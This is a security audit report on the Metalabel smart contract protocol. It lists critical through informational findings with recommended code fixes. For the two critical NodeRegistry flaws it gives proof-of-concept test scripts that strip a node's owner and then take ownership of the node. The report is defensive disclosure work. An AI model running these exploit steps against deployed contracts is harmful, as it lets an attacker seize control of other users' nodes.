# Metalabel Solo Security Review

A security review of the [Metalabel](https://www.metalabel.xyz/) smart contract protocol was done by [Gogo](https://twitter.com/gogotheauditor). \
This audit report includes all the vulnerabilities, issues and code improvements found during the security review.

## Disclaimer

"Audits are a time, resource and expertise bound effort where trained experts evaluate smart
contracts using a combination of automated and manual techniques to find as many vulnerabilities
as possible. Audits can show the presence of vulnerabilities **but not their absence**."

\- Secureum

## Risk classification

| Severity           | Impact: High | Impact: Medium | Impact: Low |
| :----------------- | :----------: | :------------: | :---------: |
| Likelihood: High   |   Critical   |      High      |   Medium    |
| Likelihood: Medium |     High     |     Medium     |     Low     |
| Likelihood: Low    |    Medium    |      Low       |     Low     |

### Impact

- **High** - leads to a significant material loss of assets in the protocol or significantly harms a group of users.
- **Medium** - only a small amount of funds can be lost (such as leakage of value) or a core functionality of the protocol is affected.
- **Low** - can lead to any kind of unexpected behaviour with some of the protocol's functionalities that's not so critical.

### Likelihood

- **High** - attack path is possible with reasonable assumptions that mimic on-chain conditions and the cost of the attack is relatively low to the amount of funds that can be stolen or lost.
- **Medium** - only conditionally incentivized attack vector, but still relatively likely.
- **Low** - has too many or too unlikely assumptions or requires a huge stake by the attacker with little or no incentive.

### Actions required by severity level

- **Critical** - client **must** fix the issue.
- **High** - client **must** fix the issue.
- **Medium** - client **should** fix the issue.
- **Low** - client **could** fix the issue.

## Executive summary

### Overview

|               |                                                                                                                                               |
| :------------ | :-------------------------------------------------------------------------------------------------------------------------------------------- |
| Project Name  | Metalabel                                                                                                                                     |
| Repository    | https://github.com/metalabel/metalabel-contracts-v1                                                                                           |
| Commit hash   | [effe2e89996d6809c5ec6c6da10c663246f91fc1](https://github.com/metalabel/metalabel-contracts-v1/tree/effe2e89996d6809c5ec6c6da10c663246f91fc1) |
| Documentation | [link](https://metalabel.notion.site/Metalabel-Protocol-Walkthrough-2080c68cc6f242ebb7813b1a9236cab1)                                         |
| Methods       | Manual review                                                                                                                                 |
|               |

### Issues found

| Severity      | Count |
| :------------ | ----: |
| Critical risk |     2 |
| High risk     |     0 |
| Medium risk   |     3 |
| Low risk      |     4 |
| Informational |     4 |

### Scope

| File                                                                                                                                                                                     | SLOC |
| :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--- |
| _Contracts (7)_                                                                                                                                                                          |
| [contracts/engine/DropEngine.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/engines/DropEngine.sol)                    | 124  |
| [contracts/AccountRegistry.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/AccountRegistry.sol)                         | 57   |
| [contracts/Collection.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Collection.sol)                                   | 169  |
| [contracts/CollectionFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/CollectionFactory.sol)                     | 34   |
| [contracts/NodeRegistry.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol)                               | 208  |
| [contracts/SplitFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/SplitFactory.sol)                               | 53   |
| [contracts/WaterfallFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/WaterfallFactory.sol)                       | 59   |
| _Abstracts (2)_                                                                                                                                                                          |
| [contracts/Resource.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Resource.sol)                                       | 33   |
| [contracts/ResourceFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/ResourceFactory.sol)                         | 38   |
| _Interfaces (6)_                                                                                                                                                                         |
| [contracts/interfaces/IAccountRegistry.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/IAccountRegistry.sol) | 7    |
| [contracts/interfaces/ICollection.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/ICollection.sol)           | 16   |
| [contracts/interfaces/IEngine.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/IEngine.sol)                   | 25   |
| [contracts/interfaces/INodeRegistry.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/INodeRegistry.sol)       | 21   |
| [contracts/interfaces/IResource.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/IResource.sol)               | 14   |
| [contracts/interfaces/IResourceFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/IResourceFactory.sol) | 28   |
| _Total (15)_                                                                                                                                                                             | 886  |

# Findings

## Critical severity

### [C-1] An attacker can directly remove the owner of any node

#### **Context**

- [contracts/NodeRegistry.sol#L248-L259](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L248-L259)

#### **Description**

As described in the [documentation](https://metalabel.notion.site/Metalabel-Protocol-Walkthrough-2080c68cc6f242ebb7813b1a9236cab1) provided by the project, the NodeRegistry smart contract implements a two-step ownership transfer process:

```
### Node ownership transfer process

Transferring node ownership is a two-step process to avoid accidentally permanently losing access to a node:

- Transfer is initiated by specifying the new owner’s Metalabel ID
    - If the node has an owner, only the owner can initiate transfer
    - If the node has no owner AND has a group node, only the owner of the group node can initiate transfer
- Transfer can then only be completed by the new owner
- The transfer can be canceled if not yet completed
    - The same semantics (and code) for initiating transfer apply when canceling a transfer
```

Although it makes the ownership transfer process more secure, an important check is omitted:

```
/// @notice Complete the 2-step node transfer process. Can only be called by
/// by the new owner
function completeNodeOwnerTransfer(uint64 id) external {
    uint64 newOwner = pendingNodeOwnerTransfers[id];
    uint64 accountId = accounts.resolveId(msg.sender);

    if (newOwner != accountId) revert NotAuthorizedForNode();

    nodes[id].owner = newOwner;
    delete pendingNodeOwnerTransfers[id];
    emit NodeOwnerSet(id, newOwner);
}
```

There is currently no verification that ownership transfer has started. In other words `completeNodeOwnerTransfer` can be called before or without even calling `startNodeOwnerTransfer`. This opens the possibility for any malicious user to call `completeNodeOwnerTransfer` from an address that does not have an account registered in the AccountRegistry contract (`accounts.resolveId(msg.sender)` will be equal to 0). Therefore, the only check used to verify that msg.sender is the new owner will pass, as both values will be the default uint64 mapping values (0).

#### **Proof Of Concept**

Place the following test case in [test/NodeRegistry.spec.ts](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/test/NodeRegistry.spec.ts)

```js
const [user, attacker] = await ethers.getSigners();

// User creates an account.
await accountRegistry.createAccount(user.address, "");
const userAccountId = await accountRegistry.resolveId(user.address);

// User creates a node and sets their Metalabel account as the owner of this node.
await createNode({ owner: userAccountId.toNumber() });
const userNodeId = await nodeRegistry.totalNodeCount();

// Assert setup.
expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(userAccountId);

// Attacker that has no Metalabel account calls nodeRegistry.completeNodeOwnerTransfer(userNodeId).
expect(await accountRegistry.resolveId(attacker.address)).to.eq(0);
await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNodeId);

// Attacker deletes the owner of the user's node. Exploit is successful.
expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(0);
```

#### **Recommended Mitigation Steps**

Ensure that `NodeRegistry.completeNodeOwnerTransfer(uint64 id)` can not be called when `pendingNodeOwnerTransfers[id]` is 0:

```diff
/// @notice Complete the 2-step node transfer process. Can only be called by
/// by the new owner
function completeNodeOwnerTransfer(uint64 id) external {
    uint64 newOwner = pendingNodeOwnerTransfers[id];
    uint64 accountId = accounts.resolveId(msg.sender);

+   if (newOwner == 0) revert NodeOwnerTranferNotStarted();
    if (newOwner != accountId) revert NotAuthorizedForNode();

    nodes[id].owner = newOwner;
    delete pendingNodeOwnerTransfers[id];
    emit NodeOwnerSet(id, newOwner);
}
```

### [C-2] An attacker can steal ownership of a node that has a group node

#### **Context**

- [contracts/NodeRegistry.sol#L222-L259](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L222-L259)

#### **Description**

As described in the [documentation](https://metalabel.notion.site/Metalabel-Protocol-Walkthrough-2080c68cc6f242ebb7813b1a9236cab1) provided by the project, the NodeRegistry smart contract implements a two-step ownership transfer process:

```
### Node ownership transfer process

Transferring node ownership is a two-step process to avoid accidentally permanently losing access to a node:

- Transfer is initiated by specifying the new owner’s Metalabel ID
    - If the node has an owner, only the owner can initiate transfer
    - If the node has no owner AND has a group node, only the owner of the group node can initiate transfer
```

While it makes the ownership transfer process more secure, an important edge case is missed - what happens if BOTH node owner and group node owner are set to 0:

```
    function startNodeOwnerTransfer(uint64 id, uint64 newOwner) external {
        NodeData memory node = nodes[id];
        uint64 accountId = accounts.resolveId(msg.sender);

        // If this node has an owner, it must be msg.sender
        if (node.owner != 0 && node.owner != accountId) {
            revert NotAuthorizedForNode();
        }
        // Else if this node has no owner, node must have a group node and
        // msg.sender must be group node owner. We are only checking the owner
        // here because we do not want to allow controllers to set the owner.
        else if (
            node.owner == 0 &&
            (node.groupNode == 0 || nodes[node.groupNode].owner != accountId)
        ) {
            revert NotAuthorizedForNode();
        }

        // start transfer process
        emit NodeOwnerTransferPending(id, newOwner);
        pendingNodeOwnerTransfers[id] = newOwner;
    }
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L222-L246

See the second check (`else if`). If a node has no owner and at the same time its group node has no owner as well, any attacker can pass this check if they have to registered account in the `AccountRegistry` (`accounts.resolveId(msg.sender)` is equal to 0).

In combination with c-1-attacker-can-directly-remove-owner-of-any-node which proved that any malicious user can remove the owner of any node, the only condition to take ownership of any node is that it has a group node.

After the exploit, the attacker will have access to all the critical functionality in the Metalabel smart contracts protocol, which has some kind of node access control / authorization mechanism.

#### **Proof Of Concept**

Place the following test case in [test/NodeRegistry.spec.ts](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/test/NodeRegistry.spec.ts)

```js
const [user, attacker, attacker2] = await ethers.getSigners();

// User creates an account.
await accountRegistry.createAccount(user.address, "");
const userAccountId = await accountRegistry.resolveId(user.address);

// User creates a node and sets their Metalabel account as the owner of this node.
await createNode({ owner: userAccountId.toNumber() });
const userNode1Id = await nodeRegistry.totalNodeCount();

// User creates a second node and sets their Metalabel account as the owner of this node and
// passes the userNode1Id as a group node.
await createNode({
  owner: userAccountId.toNumber(),
  groupNode: userNode1Id.toNumber(),
});
const userNode2Id = await nodeRegistry.totalNodeCount();

// Assert setup.
expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(userAccountId);
expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(userAccountId);
expect(await nodeRegistry.groupNodeOf(userNode2Id)).to.eq(userNode1Id);

// Attacker that has no Metalabel account calls nodeRegistry.completeNodeOwnerTransfer for both user's nodes.
expect(await accountRegistry.resolveId(attacker.address)).to.eq(0);
await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode1Id);
await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode2Id);

// Attacker deletes the owner of the user's node.
expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(0);
expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(0);

// Attacker uses a second ethereum address that we owns and registers a Metalabel account with it.
await accountRegistry.createAccount(attacker2.address, "");
const attacker2AccountId = await accountRegistry.resolveId(attacker2.address);

// Attacker calls nodeRegistry.startNodeOwnerTransfer and steals the ownership of the second user's node.
await expect(
  nodeRegistry
    .connect(attacker)
    .startNodeOwnerTransfer(userNode2Id, attacker2AccountId)
).to.not.be.reverted;

// Exploit is successful.
expect(await nodeRegistry.pendingNodeOwnerTransfers(userNode2Id)).to.eq(
  attacker2AccountId
);

// Finish attack.
await expect(
  nodeRegistry.connect(attacker2).completeNodeOwnerTransfer(userNode2Id)
).to.not.be.reverted;
expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(attacker2AccountId);
```

#### **Recommended Mitigation Steps**

Ensure that `NodeRegistry.startNodeOwnerTransfer` can't be executed when the node's group node has no owner:

```diff
/// @notice Start the 2-step node transfer process. Can only be called by
/// the existing node owner if there is one, or by the group owner if not.
/// if newOwner = 0, the node owner transfer will be canceled effectively
function startNodeOwnerTransfer(uint64 id, uint64 newOwner) external {
    NodeData memory node = nodes[id];
    uint64 accountId = accounts.resolveId(msg.sender);

    // If this node has an owner, it must be msg.sender
    if (node.owner != 0 && node.owner != accountId) {
        revert NotAuthorizedForNode();
    }
    // Else if this node has no owner, node must have a group node and
    // msg.sender must be group node owner. We are only checking the owner
    // here because we do not want to allow controllers to set the owner.
    else if (
        node.owner == 0 &&
-       (node.groupNode == 0 || nodes[node.groupNode].owner != accountId)
+       (node.groupNode == 0 ||
+               (nodes[node.groupNode].owner != accountId && accountId != 0))
    ) {
        revert NotAuthorizedForNode();
    }

    // start transfer process
    emit NodeOwnerTransferPending(id, newOwner);
    pendingNodeOwnerTransfers[id] = newOwner;
}
```

Note: Solving only the first critical will not solve the second because even without the first attack vector setting the owners of both nodes to 0 is still a possible scenario.

## Medium severity

### [M-1] EIP 2098 royalty basis points not checked against the maximum value allowed

#### **Context**

- [contracts/engines/DropEngine.sol#L191-238](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/engines/DropEngine.sol#L191-238)
- [contracts/engines/DropEngine.sol#L266-L276](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/engines/DropEngine.sol#L266-L276)

#### **Description**

Authorized users can configure sequences with royaltyBps > 10000 (>100%) as there is no such input validation. Such input may be entered due to front-end issues or wrong decimals (e.g. passing 10e18 instead of 10e2 for royaltyBps of 10%). This will make users pay a large amount of royalty.

#### **Recommended Mitigation Steps**

Check royaltyBps <= 10000 in DropEngine.configureSequence():

```diff
    (
        uint80 price,
        uint16 royaltyBps,
        address payable recipient,
        string memory uriPrefix,
        address mintAuthority
    ) = abi.decode(engineData, (uint80, uint16, address, string, address));

+   if (royaltyBps > 10000) revert InvalidRoyaltyBps();
```

Also considered using a constant variable such as `uint16 constant ROYALTY_BPS = 10000;`

### [M-2] Non-existent ethereum accounts (e.g. the null address) can have a registered Metalabel account

#### **Context**

- [contracts/AccountRegistry.sol#L117-L133](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/AccountRegistry.sol#L117-L133)

#### **Description**

There are currently two types of account creation in the AccountRegistry contract:

1. Authorized issuer creates accounts for users
2. Any user can create an account for any ethereum address after the AccountRegistry contract owner is set to `address(0)`

The second one doesn't seem quite right as it means that any ethereum address can have an account created. Users may not be using the Metalabel protocol or may wish to create their account at different/specific time. It also means that any ethereum address can have an account registered in the Metalabel protocol (e.g. even `address(0)` can have an account if `owner == 0` and `createAccount(address(0), "")` is called), which can lead to unexpected behavior such as relying on `resolveId(address(0))` to return 0.

#### **Recommended Mitigation Steps**

Consider using msg.sender instead of `subject` in AccountRegistry.createAccount when `owner == address(0)`:

```diff
/// @inheritdoc IAccountRegistry
function createAccount(address subject, string calldata metadata)
    external
    returns (uint64 id)
{
+   if (owner == address(0) && subject != msg.sender) revert NotAuthorizedAccountIssuer();
    ...

```

If the goal is to allow users to create their accounts without spending money on the transaction's gas cost, it would be better to add a signature verification step that verifies that the "subject" has signed an agreement message for their Metalabel account to be created by `msg.sender`.

### [M-3] Insufficient input validation in multiple core functions

#### **Context**

- [contracts](https://github.com/metalabel/metalabel-contracts-v1/tree/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts)

#### **Description**

There is insufficient validation of input parameters in many functions around the entire repo, as well as many assumptions being made. Most of these are related to the lack of input validation of null-valued parameters and also validation of variables being equal to the default values of mappings in storage. This lack of input validation and unsafety assumptions are dangerous and in some places even lead to critical problems such as c-1-the-attacker-can-directly-remove-the-owner-of-any-node and c-2-the-attacker-can- to-steal-ownership-of-a-node-that-has-a-node-group in the current audit report.

#### **Recommended Mitigation Steps**

Improve input parameter validation and eliminate as many assumptions as possible, such as the following:

```
contracts/engines/DropEngine.sol

// If collection is a malicious contract, that does not impact any state
// in the engine.  If it's a valid protocol-deployed collection, then it
// will work as expected.
tokenId = collection.mintRecord(msg.sender, sequenceId); // @audit should not provide the opportunity to attacker to make any arbitrary external contract calls from the DropEngine, revert if collection doesn't have a configured sequence
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/engines/DropEngine.sol#L146-L149

```diff
contracts/NodeRegistry.sol

/// @audit if id == 0 or id >= totalNodeCount or simply node.owner == accountId == 0, NodeOwnerSet will be emitted which may trigger wrong off-chain handling
/// @notice Allow the owner of a node to reliquish ownership.
function removeNodeOwner(uint64 id) external {
    NodeData memory node = nodes[id];
    uint64 accountId = accounts.resolveId(msg.sender);

-   if (node.owner != accountId) {
+   if (node.owner != accountId || node.owner == 0) {
        revert NotAuthorizedForNode();
    }

    nodes[id].owner = 0;
    delete pendingNodeOwnerTransfers[id];
    emit NodeOwnerSet(id, 0);
}
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L208-L220

```diff
contracts/NodeRegistry.sol

/// @audit if id == 0 or id >= totalNodeCount or simply newOwner == accountId == 0, NodeOwnerSet will be emitted which may trigger wrong off-chain handling
/// @notice Complete the 2-step node transfer process. Can only be called by
/// by the new owner
function completeNodeOwnerTransfer(uint64 id) external {
    uint64 newOwner = pendingNodeOwnerTransfers[id];
    uint64 accountId = accounts.resolveId(msg.sender);

-   if (newOwner != accountId) revert NotAuthorizedForNode();
+   if (newOwner != accountId || newOwner == 0) revert NotAuthorizedForNode();

    nodes[id].owner = newOwner;
    delete pendingNodeOwnerTransfers[id];
    emit NodeOwnerSet(id, newOwner);
}
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L248-L259

```diff
contracts/NodeRegistry.sol

/// @audit add check for `|| node >= totalNodeCount` or `|| mnode.nodeType == 0` as is done in isAuthorizedAccountForNode
/// @inheritdoc INodeRegistry
function isAuthorizedAddressForNode(uint64 node, address subject)
    public
    view
    returns (bool isAuthorized)
{
    NodeData memory mnode = nodes[node];
    uint64 account = accounts.resolveId(subject);

    // invalid or root node has no authorized addresses
-   if (node == 0) {
+   if (node == 0 || mnode.nodeType == 0) {
        isAuthorized = false;
    }

    ...
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L373-L385

## Low severity

### [L-1] Potential DoS when revenue recipient is a smart contract

#### **Context**

- [contracts/engines/DropEngine.sol#L137-L141](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/engines/DropEngine.sol#L137-L141)

#### **Description**

Using `address.transfer()` is a bad practise as it limits the gas sent to the recipient's fallback function (in case of the recipient being a smart contract account) to 2300 gas units. Although a comment states that this is purposely used to protect against a malicious contract as the recipient of DropEngine.mint revenue:

```
// Immediately forward payment to the recipient. revenueRecipient could
// be a malicious contract but transfer has a 2300 gas limit
if (drop.price > 0) {
    drop.revenueRecipient.transfer(msg.value);
}
```

this will result in a DoS for that drop if drop.revenueRecipient is set to a normal contract that e.g. is a proxy which delegates in its `receive() payable` or `fallback() payable` function, emits an event when it receives funds or simply supports some friendly logic.

#### **Recommendations**

I'd recommend using a low-level value call and solving the malicious revenue recipient contract problem with a different approach, such as using OpenZeppelin's `nonReentrant` modifier or simply applying the CEI (Checks-Effects-Interactions) pattern.

### [L-2] Use \_safeMint instead of \_mint to prevent NFTs from being locked in a contract that does not handle such tokens

#### **Context**

- [contracts/Collection.sol#L235](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Collection.sol#L235) & [contracts/Collection.sol#L250](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Collection.sol#L250)

#### **Description**

In `DropEngine.permissionedMint`, if the `to` address is a smart contract that does not implement ERC721 token handling, minted tokens will be stucked because `collection.mintRecord` uses ERC721.\_mint instead of ERC721.\_safeMint.

#### **Recommendations**

As OpenZeppelin's ERC721 implementation says, `_mint` should be avoided and `_safeMint` should be used whenever possible. \
Consider adding the arguments `uint16 sequenceId` and `uint80 data` to the `_safeMint` functions in the @metalabel/solmate library so that it can be used in "Collection.mintRecord" instead of `_mint`.

### [L-3] Move the node authorization checks and modifiers into a single abstract contract

#### **Context**

- [contracts/NodeRegistry.sol#L135-L141](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L135-L141)
- [contracts/Resource.sol#L63-L75](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Resource.sol#L63-L75)
- [contracts/ResourceFactory.sol#L75-L87](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/ResourceFactory.sol#L75-L87)
- [contracts/SplitFactory.sol#L96-L101](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/SplitFactory.sol#L96-L101)
- [contracts/WaterfallFactory.sol#L100-L105](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/WaterfallFactory.sol#L100-L105)

#### **Description**

There is currently code duplication when it comes to authorizing that msg.sender has rights to manage a given node. There are 3 modifiers and 2 checks split into a total of 5 files that have exactly the same purpose with minor changes regarding the input argument and source nodeRegistry. Having so many similar code snippets that serve the same purpose in multiple files is bad practice and can be abstracted.

#### **Recommendations**

I would suggest creating an abstract contract, e.g. Authorization.sol that all contracts that need to perform some kind of authorization checks on a node can inherit. It might look like this:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {INodeRegistry} from "./interfaces/INodeRegistry.sol";

abstract contract NodeAuthorization {
    error NotAuthorizedForNode();

    modifier onlyAuthorized(address nodeRegistry, uint64 controlNode) {
        if (
            !INodeRegistry(nodeRegistry).isAuthorizedAddressForNode(
                controlNode,
                msg.sender
            )
        ) {
            revert NotAuthorizedForNode();
        }
        _;
    }
}
```

And then it can be used by (inherited from) the Resource, ResourceFactory, SplitFactory and WaterfallFactory contracts:

```diff
contracts/Resource.sol

+   import {NodeAuthorization} from "./NodeAuthorization.sol";

-   abstract contract Resource is IResource {
+   abstract contract Resource is IResource, NodeAuthorization {
        ...

-       /// @dev Make a function only callable by a msg.sender that is authorized
-       /// to manage the control node of this resource
-       modifier onlyAuthorized() {
-           if (
-               !nodeRegistry().isAuthorizedAddressForNode(
-                   controlNode(),
-                   msg.sender
-               )
-           ) {
-               revert NotAuthorized();
-           }
-           _;
-       }

        ...

        /// @inheritdoc IResource
        function broadcast(string calldata topic, string calldata message)
            external
-           onlyAuthorized
+           onlyAuthorized(nodeRegistry(), controlNode())

        /// @inheritdoc IResource
        function broadcastAndStore(string calldata topic, string calldata message)
            external
-           onlyAuthorized
+           onlyAuthorized(nodeRegistry(), controlNode())

        ...
     }
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Resource.sol#L63-L96

```diff
contracts/ResourceFactory.sol

+   import {NodeAuthorization} from "./NodeAuthorization.sol";

-   abstract contract ResourceFactory is IResourceFactory
+   abstract contract ResourceFactory is IResourceFactory, NodeAuthorization {
        ...

-       /// @dev Make a function only callable by a msg.sender that is authorized
-       /// to manage the control node of this resource
-       modifier onlyAuthorized(address resource) {
-           if (
-               !nodeRegistry.isAuthorizedAddressForNode(
-                   controlNode[resource],
-                   msg.sender
-               )
-           ) {
-               revert NotAuthorized();
-           }
-           _;
-       }

        ...

        /// @inheritdoc IResourceFactory
        function broadcast(
            address waterfall,
            string calldata topic,
            string calldata message
-       ) external onlyAuthorized(waterfall) {
+       ) external onlyAuthorized(nodeRegistry, controlNode[waterfall])

        /// @inheritdoc IResourceFactory
        function broadcastAndStore(
            address waterfall,
            string calldata topic,
            string calldata message
-       ) external onlyAuthorized(waterfall) {
+       ) external onlyAuthorized(nodeRegistry, controlNode[waterfall])

        ...
     }
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/ResourceFactory.sol#L75-L87

```diff
contracts/SplitFactory.sol


+   import {NodeAuthorization} from "./NodeAuthorization.sol";

-   contract SplitFactory is ResourceFactory {
+   contract SplitFactory is ResourceFactory, NodeAuthorization {
        ...

        /// @notice Launch a new split
        function createSplit(
            address[] calldata accounts,
            uint32[] calldata percentAllocations,
            uint32 distributorFee,
            uint64 controlNodeId,
            string calldata metadata
-       ) external returns (address split) {
-           // Ensure msg.sender is authorized to manage the control node.
-           if (
-               !nodeRegistry.isAuthorizedAddressForNode(controlNodeId, msg.sender)
-           ) {
-               revert NotAuthorized();
-           }
+       ) external onlyAuthorized(nodeRegistry, controlNodeId) returns (address split)

        ...
    }
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/SplitFactory.sol#L96-L101

```diff
contracts/WaterfallFactory.sol

+   import {NodeAuthorization} from "./NodeAuthorization.sol";

-   contract WaterfallFactory is ResourceFactory {
+   contract WaterfallFactory is ResourceFactory, NodeAuthorization {
        ...

        /// @notice Launch a new split
        function createWaterfall(
            address token,
            address nonWaterfallRecipient,
            address[] calldata recipients,
            uint256[] calldata thresholds,
            uint64 controlNodeId,
            string calldata metadata
-       ) external returns (address waterfall) {
-           // Ensure msg.sender is authorized to manage the control node.
-           if (
-               !nodeRegistry.isAuthorizedAddressForNode(controlNodeId, msg.sender)
-           ) {
-               revert NotAuthorized();
-           }
+       ) external onlyAuthorized(nodeRegistry, controlNodeId) returns (address waterfall)

        ...
     }
```

https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/WaterfallFactory.sol#L100-L105

### [L-4] uint80 should be used instead of uint64 for SequenceData.minted

#### **Context**

- [contracts/interfaces/IEngine.sol#L12](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/interfaces/IEngine.sol#L12)
- [contracts/Collection.sol#L249](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/Collection.sol#L249)

#### **Description**

In the `SequenceData` structure, the `minted` property is of type uint64. In `Collection.mintRecord(address to, uint16 sequenceId)` it is updated and cached in a stack variable again of type uint64. It is later passed to the @metalabel/solmate ERC721.\_mint function as the `data` property, which is of type uint80.

```
struct SequenceData {
    uint64 sealedBeforeTimestamp;
    uint64 sealedAfterTimestamp;
    uint64 maxSupply;
    uint64 minted; // @audit should be of type uint80
    IEngine engine;
    uint64 dropNodeId;
    // 4 bytes remaining
}
```

```
contract Collection is ERC721, Resource, Clone, ICollection, IERC2981 {
    ...

    function mintRecord(address to, uint16 sequenceId)
        external
        returns (uint256 tokenId)
    {
        SequenceData storage sequence = sequences[sequenceId];
        ...
        uint64 editionNumber = ++sequence.minted;
        _mint(to, tokenId, sequenceId, editionNumber);
        ...
    }

    ...
}
```

```
abstract contract ERC721 {
    ...

    function _mint(address to, uint256 id, uint16 sequenceId, uint80 data) internal virtual {
        ...
    }

    ...
}
```

#### **Recommendations**

Consider changing the type of `SequenceData.minted` from uint64 to uint80.

Note: Only 2 bytes will remain free in the second storage slot of the packed struct.

## Informational

### [I-1] Use more NatSpec comments to improve readability

#### **Context**

- [contracts](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts)

#### **Description**

Right now the code is a bit unreadable considering how many abstractions there are and the lack of comprehensive comments for each of the functions.

#### **Recommendations**

Following [the Solidity Style Guide sections](https://docs.soliditylang.org/en/v0.8.18/style-guide.html), try to write as detailed comments as possible to make it easier for auditors, developers or other technical guys to understand the purpose of each particular feature and its parameters.

### [I-2] Duplicate event parameters

#### **Context**

- [contracts/WaterfallFactory.sol#L59-L67](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/WaterfallFactory.sol#L59-L67)

#### **Description**

The `WaterfallCreated` event in the WaterfallFactory contract is emitted whenever a new waterfall module is created via `WaterfallFactory.createWaterfall`. The following parameters are redundant because `WaterfallModuleFactory.createWaterfallModule` also emits an event with these parameters, so they can be taken from there:

```
splits-waterfall/src/WaterfallModuleFactory.sol

event CreateWaterfallModule(
    address indexed waterfallModule,
    address token,
    address nonWaterfallRecipient,
    address[] recipients,
    uint256[] thresholds
);
```

